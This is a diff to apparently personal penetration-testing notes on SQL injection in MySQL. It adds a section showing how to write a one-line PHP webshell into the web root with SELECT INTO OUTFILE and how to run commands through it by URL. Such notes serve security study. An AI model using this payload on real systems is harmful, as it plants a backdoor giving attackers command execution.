@@ -68,10 +68,16 @@ SHOW VARIABLES LIKE 'secure_file_priv';
 SELECT variable_name,variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv';
 ```
 ```SQL
-SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee='[user]'
+SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee='[user]';
 ```
 
 > When writing webshells, we need to know the web root dir. There are common ones such as `/var/www/html/` but we can potentially read the config at `/etc/apache2/apache2.conf` or `/etc/nginx/nginx.conf` or `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config` (for IIS / [[MSSQL]])
+
+#### Writing a simple PHP webshell
+```SQL
+SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+```
+> `http://SERVER_IP:PORT/shell.php?0=[cmd]`
 ### Reading Files
 If appropriate settings and privileges allow it, we can read files too
 ```sql
